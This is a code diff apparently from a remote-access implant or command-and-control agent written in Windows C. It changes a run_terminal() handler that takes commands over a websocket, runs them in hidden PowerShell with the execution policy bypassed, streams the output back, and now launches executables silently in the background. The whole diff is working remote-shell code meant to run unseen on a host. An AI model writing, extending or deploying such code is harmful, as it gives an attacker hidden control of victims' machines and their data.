@@ -1263,34 +1263,88 @@ void run_terminal() {
         si.wShowWindow = SW_HIDE;
         ZeroMemory(&pi, sizeof(pi));
         
-        // Build PowerShell command with proper escaping for special chars
-        // Quote the current directory to handle spaces and special chars like &
-        char full_cmd[8192];
-        sprintf(full_cmd, 
-            "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
-            "Set-Location -LiteralPath '%s'; %s\"",
-            g_current_dir, cmd);
+        // Check if command is running an executable directly (e.g., ./program.exe or program.exe)
+        // These should be launched detached without waiting
+        char* exe_check = cmd;
+        if (strncmp(exe_check, "./", 2) == 0 || strncmp(exe_check, ".\\", 2) == 0) {
+            exe_check += 2;
+        }
+        // Check for .exe at end of first word
+        char first_word[MAX_PATH];
+        int fw_len = 0;
+        for (int i = 0; cmd[i] && cmd[i] != ' ' && fw_len < MAX_PATH - 1; i++) {
+            first_word[fw_len++] = cmd[i];
+        }
+        first_word[fw_len] = '\0';
+        int is_exe_launch = (fw_len > 4 && _stricmp(first_word + fw_len - 4, ".exe") == 0);
         
-        if (CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, 
-                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        if (is_exe_launch) {
+            // Launch executable detached without waiting
             CloseHandle(hWritePipe);
+            CloseHandle(hReadPipe);
             
-            char buffer[4096];
-            DWORD bytesRead;
-            
-            while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-                buffer[bytesRead] = '\0';
-                send_websocket_data(buffer, bytesRead);
+            // Build full path if relative
+            char exe_path[MAX_PATH];
+            if (strncmp(cmd, "./", 2) == 0 || strncmp(cmd, ".\\", 2) == 0) {
+                sprintf(exe_path, "%s\\%s", g_current_dir, cmd + 2);
+            } else if (cmd[0] != '\\' && (strlen(cmd) < 2 || cmd[1] != ':')) {
+                sprintf(exe_path, "%s\\%s", g_current_dir, cmd);
+            } else {
+                strncpy(exe_path, cmd, MAX_PATH - 1);
+                exe_path[MAX_PATH - 1] = '\0';
             }
             
-            WaitForSingleObject(pi.hProcess, INFINITE);
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            CloseHandle(hReadPipe);
+            // Launch detached using start command
+            char start_cmd[MAX_PATH * 2];
+            sprintf(start_cmd, "cmd.exe /c start \"\" \"%s\"", exe_path);
+            
+            STARTUPINFOA si2;
+            PROCESS_INFORMATION pi2;
+            ZeroMemory(&si2, sizeof(si2));
+            si2.cb = sizeof(si2);
+            si2.dwFlags = STARTF_USESHOWWINDOW;
+            si2.wShowWindow = SW_HIDE;
+            ZeroMemory(&pi2, sizeof(pi2));
+            
+            if (CreateProcessA(NULL, start_cmd, NULL, NULL, FALSE, 
+                              CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
+                CloseHandle(pi2.hProcess);
+                CloseHandle(pi2.hThread);
+                send_websocket_data("[+] Launched in background\n", 27);
+            } else {
+                send_websocket_data("[!] Failed to launch\n", 21);
+            }
         } else {
-            CloseHandle(hWritePipe);
-            CloseHandle(hReadPipe);
-            send_websocket_data("[!] Failed to execute\n", 22);
+            // Regular command - execute and wait for output
+            // Build PowerShell command with proper escaping for special chars
+            // Quote the current directory to handle spaces and special chars like &
+            char full_cmd[8192];
+            sprintf(full_cmd, 
+                "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
+                "Set-Location -LiteralPath '%s'; %s\"",
+                g_current_dir, cmd);
+            
+            if (CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, 
+                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                CloseHandle(hWritePipe);
+                
+                char buffer[4096];
+                DWORD bytesRead;
+                
+                while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
+                    buffer[bytesRead] = '\0';
+                    send_websocket_data(buffer, bytesRead);
+                }
+                
+                WaitForSingleObject(pi.hProcess, INFINITE);
+                CloseHandle(pi.hProcess);
+                CloseHandle(pi.hThread);
+                CloseHandle(hReadPipe);
+            } else {
+                CloseHandle(hWritePipe);
+                CloseHandle(hReadPipe);
+                send_websocket_data("[!] Failed to execute\n", 22);
+            }
         }
         
         // Update current dir in case command changed it
